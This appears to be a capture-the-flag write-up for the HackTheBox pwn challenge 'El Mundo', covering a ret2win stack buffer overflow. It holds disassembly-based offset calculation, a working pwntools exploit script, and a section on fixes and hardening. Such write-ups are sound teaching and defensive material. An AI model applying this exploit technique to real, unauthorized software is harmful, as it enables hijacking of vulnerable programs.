## Overview

**El Mundo** is an Easy HackTheBox **Pwn** challenge. The binary has no stack canary and no PIE, and reads far more data than its buffer holds — a textbook [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html). A `read_flag()` function sits in the binary waiting to be called; the only task is to calculate the exact padding to overwrite the return address and redirect execution there.

## The technique

Classic **ret2win**: the binary allocates a fixed-size stack buffer, reads user input with no length check (via `read()`), and a win function (`read_flag`) opens and prints `flag.txt`. No canary means we can smash the return address freely. No PIE means the win function address is fixed in every run — no leak required.

One curveball: `checksec` reports `SHSTK: Enabled` and `IBT: Enabled` (Intel CET flags). These are ELF property notes compiled in with `-fcf-protection`. They only take effect when both the CPU and the OS kernel enforce CET — standard HTB challenge containers do not, so the overflow works identically to any non-CET binary.

## Solution

**Find the offset.** Disassemble `main()`:

```
sub $0x30, %rsp          ; 0x30-byte frame
lea -0x30(%rbp), %rax    ; buffer starts here
mov $0x100, %edx         ; reads 256 bytes — far more than 0x30
call read@plt
```

The buffer starts at `rbp - 0x30`. The return address lives at `rbp + 0x08`. Bytes between them:

```
offset = 0x30 (buf→rbp) + 0x08 (saved rbp) = 0x38 = 56
```

**Find the win address.** The binary is not stripped and not PIE:

```bash
objdump -d el_mundo | grep '<read_flag>'
# 00000000004016b7 <read_flag>:
```

`read_flag` starts with `endbr64` — a valid IBT target even if IBT were somehow enforced.

**Exploit:**

```python
from pwn import *

context.arch = 'amd64'
r = remote('TARGET', PORT)
e = ELF('./el_mundo', checksec=False)

payload = b'A' * 0x38 + p64(e.symbols['read_flag'])
r.sendlineafter(b'> ', payload)

output = r.recvall(timeout=5)
print(next(l for l in output.split(b'\n') if b'HTB{' in l).decode())
```

Running against the live instance:

```
Flag --> HTB{...}
```

## Why it worked

`read(0, buf, 0x100)` trusts the caller to not exceed 0x30 bytes — it never will, so the input fills the buffer, overwrites the `deadbeef` sentinel stored above it, smashes the saved frame pointer, and finally overwrites the return address with `read_flag`. On `ret`, the CPU jumps to `read_flag`, which opens `flag.txt` and prints every byte via `fputc`.

The root cause is [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html) — an unchecked fixed-size copy (via `read()`) into an undersized stack buffer.

## Fix / defense

- Replace `read(0, buf, 0x100)` with `read(0, buf, sizeof(buf))` — bound the read to the actual buffer size.
- Compile with `-fstack-protector-strong` to insert a stack canary; a canary abort fires before the corrupted return address is ever used.
- Enable ASLR and compile with `-fPIE -pie` so the win function has no fixed address to jump to.
- A real-world hardening stack would also enforce CET at the OS/CPU level, making IBT and SHSTK meaningful at runtime.
